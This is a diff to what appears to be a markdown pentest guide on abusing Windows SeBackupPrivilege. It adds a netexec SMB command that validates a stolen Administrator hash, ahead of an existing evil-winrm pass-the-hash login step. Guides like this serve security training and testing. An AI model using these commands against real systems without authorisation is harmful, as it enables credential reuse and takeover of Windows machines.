@@ -105,7 +105,11 @@ The `SeBackupPrivilege` allows users to bypass file and directory permissions to
   ```
   ![image](https://github.com/user-attachments/assets/e578c8bf-73ea-4411-b89f-f1570dbec664)
 
-10. **Perform a PTH attack using Evil-WinRM:**
+10. **Check The Hash**
+    ``` shell
+    netexec smb $IP -u <'Administrator'> -H <'Hash'> "whoami"
+    ```
+12.  **Perform a PTH attack using Evil-WinRM:**
    ```
    evil-winrm -i <ip> -u "Administrator" -H "<hash>"
    ```
